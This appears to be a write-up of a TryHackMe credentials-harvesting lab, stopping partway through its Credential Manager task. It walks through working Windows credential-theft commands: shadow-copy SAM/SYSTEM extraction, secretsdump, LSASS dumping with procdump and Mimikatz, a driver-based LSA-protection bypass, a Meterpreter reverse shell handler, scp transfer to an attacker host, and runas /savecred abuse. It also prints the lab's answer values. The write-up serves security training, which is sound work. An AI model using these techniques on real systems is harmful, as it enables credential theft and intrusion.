![image](https://github.com/user-attachments/assets/2fb2c90e-77fb-422e-9387-b6d976b7a251)


# Credentials Harvesting
  Apply current authentication models employed in modern environments to a red team approach.

TryHackMe room [link](https://tryhackme.com/room/credharvesting)

<br>

## Task 1 : Introduction

- **What** is Credentials Harvesting?
    - Extracting login details (usernames, passwords) from systems via:
      - `Clear-text` files
      - `Registry` entries
      - `Memory dumps`
      - `SAM` database
      - `Windows Credentials Manager`

- **Why** Harvest Credentials?
  - **Lateral Movement:** Access other systems in the network.
  - **Stealth:** Legitimate credentials reduce detection risk.
  - **Persistence:** Create/manage accounts for long-term access.

**Objectives:**
- Extract credentials from the Windows SAM database.
- Dump clear-text passwords and Kerberos tickets from memory (locally/remotely).
- Exploit Windows Credentials Manager.
- Harvest credentials from Domain Controllers (`DCs`).
- Enumerate Local Administrator Password Solution (`LAPS`).
- Explore AD-specific attacks for credential theft.



<br>

## Task 2 : Credentials Harvesting
   
  Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look 
for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials.

  _"Steal credentials → Move laterally → Stay hidden."_

In this task we simply need to start the machine.. 


<br>


## Task 3 : Credential Access
Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of 
a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than 
exploiting systems using CVEs.


  In this task we have to find credentials stored insecurely in `Windows Registry` and `Active Directory` (AD) user descriptions.

> Workflow...

### 1: Windows Registry
Command:
    
      reg query HKLM /f password /t REG_SZ /s

- Explanation:
    - Searches the Local Machine (`HKLM`) registry hive for the keyword "flag".
    - `/t` REG_SZ: Limits results to string values.
    - `/s`: Recursively searches all subkeys.
  
  ![image](https://github.com/user-attachments/assets/aa636589-ea0c-48a2-8ef5-ae196920bf14)

- Alternative (Current User Hive):

      reg query HKCU /f flag /t REG_SZ /s
  
### 2: AD User Description
Command (PowerShell):

      Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null} | Select-Object Name, Description
      
- Explanation:
  - Lists all AD users with non-empty descriptions.

![image](https://github.com/user-attachments/assets/7d7e4eff-703f-4f76-aa5a-696780677765)


Look for passwords or sensitive info in the Description field.

<br>

## _Answers_

Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry?
    
      7tyh4ckm3
      
Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
  
      Passw0rd!@#

<br>

## Task 4: Local Windows Credentials

  This task covers methods to extract local Windows credentials stored in the SAM database, including:

1. **Metasploit's** hashdump: Dumps hashes from memory (`LSASS`).
2. **Volume Shadow Copy:** Creates a backup of the `SAM` file while Windows is running.
3. **Registry Hives:** Extracts `SAM/SYSTEM` files from the registry for offline decryption.

> Files Needed:
- **SAM:** Contains user hashes (encrypted).
- **SYSTEM:** Contains the boot key to decrypt the SAM.


> Workflow...

### 1: Volume Shadow Copy (Manual)
- Create a Shadow Copy:

      wmic shadowcopy call create Volume='C:\'
  ![image](https://github.com/user-attachments/assets/1005a73f-d248-4e04-b288-c3815711274b)


- Verify with:

      vssadmin list shadows
  ![image](https://github.com/user-attachments/assets/715d5b92-65a7-4f13-b3b9-950325ecc5ba)

Note the Shadow Copy Volume path (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`).

- Copy SAM & SYSTEM Files:

      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\\users\thm\Desktop\system

  ![image](https://github.com/user-attachments/assets/796ad428-a9ee-4429-9383-1e9cee0897e6)


- Transfer to AttackBox (e.g., with `SCP`):

      scp root@ATTACKER_IP:C:\sam .
      scp root@ATTACKER_IP:C:\system .
  
- Decrypt with Impacket:

      python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL
  
     - Output:

              Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
              NTLM Hash: 98d3a787a80d08385cea7fb4aa2a4261

### 2: Registry Hives (Alternative)
- Export SAM & SYSTEM from Registry:

      reg save HKLM\sam C:\sam-reg
      reg save HKLM\system C:\system-reg
  
- Decrypt with Impacket (same as above).

### 3: Metasploit hashdump (Quick)
- Get Meterpreter Shell (if not already):

      use exploit/multi/handler
      set payload windows/x64/meterpreter/reverse_tcp
      exploit
  
- Dump Hashes:

        meterpreter > hashdump
    - Output: Same as Method 1.
 

<br>

## _Answers_

Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?

      98d3a787a80d08385cea7fb4aa2a4261
      

> TO FIND
- For this, I started with checking the shadow copy..
   
       vssadmin list shadows

- After this, I copied both, sam & system files..

      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\\users\thm\Desktop\system         

  ![image](https://github.com/user-attachments/assets/3f8bbaf0-e482-4486-ae2f-24f43bd7c57b)

  

  Now, we got our self the copies of both files.
  ![image](https://github.com/user-attachments/assets/065227a1-bfbf-45f7-b53b-ae8579425ee6)


- Now, we need to move these files to our Attacker Machine, so I simply used scp for file transfer..

        scp sam root@10.10.90.246:/root/.
  ![image](https://github.com/user-attachments/assets/bb813a5c-859a-4386-91fe-3ebf30cd6fc8)


  Simillarly, I used the same command again by just changing the file name..

      scp system root@10.10.90.246:/root/.

  ![image](https://github.com/user-attachments/assets/9c0dcb28-777a-4d25-9be8-2aea3fe53772)


  We can see the files in our attack machine.
  
  ![image](https://github.com/user-attachments/assets/7aeb6599-4410-4e80-b701-3295a0b7fee8)


- Now, It's time to decrypt with Impacket:

      python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL

![image](https://github.com/user-attachments/assets/e9948ea5-8e8a-4fa3-90ba-c8cba6c0d7ec)


So, we can our NTLM hash..


     


  
<br>      


## Task 5: LSASS Memory Dumping
**Objective:** Extract credentials (NTLM hashes, Kerberos tickets, clear-text passwords) from the LSASS process memory.


- What is LSASS?
    - Windows process managing security policies and caching credentials (hashes, tickets) for logged-in users.
    - Target for attackers to escalate privileges or move laterally.
- Methods to Dump LSASS Memory:
  - GUI (Task Manager):
    - Right-click lsass.exe → "Create dump file" → Analyze offline.
  - Command-Line (ProcDump):
  
        procdump.exe -accepteula -ma lsass.exe C:\dump.dmp
    
  - Mimikatz (Direct Extraction):
  
        privilege::debug          # Enable debug privileges
        sekurlsa::logonpasswords  # Dump cached credentials
  
- LSA Protection (Mitigation):
  - Microsoft’s defense to block LSASS memory access.
- Enabled via registry:

      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
- Bypass with Mimikatz:
  
      !+                          # Load mimidrv.sys kernel driver
      !processprotect /process:lsass.exe /remove  # Disable LSA protection
      sekurlsa::logonpasswords    # Now works!
  
### How It Works in Practice
- Dump LSASS Memory:
  - Use procdump or Task Manager to create a snapshot (lsass.dmp).

- Analyze Offline:
  - Transfer the dump to your attack machine.
    
- Use Mimikatz/Impacket to extract hashes:

        python3 /opt/impacket/examples/secretsdump.py -security lsass.dmp LOCAL

- Bypass LSA Protection:
  - If sekurlsa::logonpasswords fails with "Access Denied (0x00000005)":
  - Load Mimikatz’s kernel driver (!+).
  - Disable protection (!processprotect).
  - Retry dumping.
 


<br>

## _Answers_
Is the LSA protection enabled? (Y|N)
          
          Y
        

<br>


## Task 6 : Windows Credential Manager

**Objective:** Extract stored credentials (usernames/passwords) from Windows Credential Manager using:

  - vaultcmd (built-in)
  - cmdkey (built-in)
  - runas /savecred (abuse saved credentials)
  - Mimikatz (memory dumping)

> Workflow...

1. Enumerate Stored Credentials

- List all vaults:

      vaultcmd /list
  
- Check credentials in a vault (e.g., Web Credentials):

      vaultcmd /listcreds:"Web Credentials"
  
Example output:
<pre>

  Resource: internal-app.thm.red  
  Identity: THMUser  

<pre>
  
2. Extract Clear-Text Passwords
PowerShell (Get-WebCredentials.ps1):

powershell
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
Output:

text
UserName  Resource             Password
--------  --------             --------
THMUser   internal-app.thm.red Password!
Mimikatz (Memory Dump):

mimikatz
privilege::debug
sekurlsa::credman
Extracts clear-text passwords cached in memory.

3. Abuse runas /savecred
List saved credentials:

cmd
cmdkey /list
Execute commands as another user:

cmd
runas /savecred /user:THM.red\thm-local cmd.exe
Then read the flag:

cmd
type "c:\Users\thm-local\Saved Games\flag.txt"








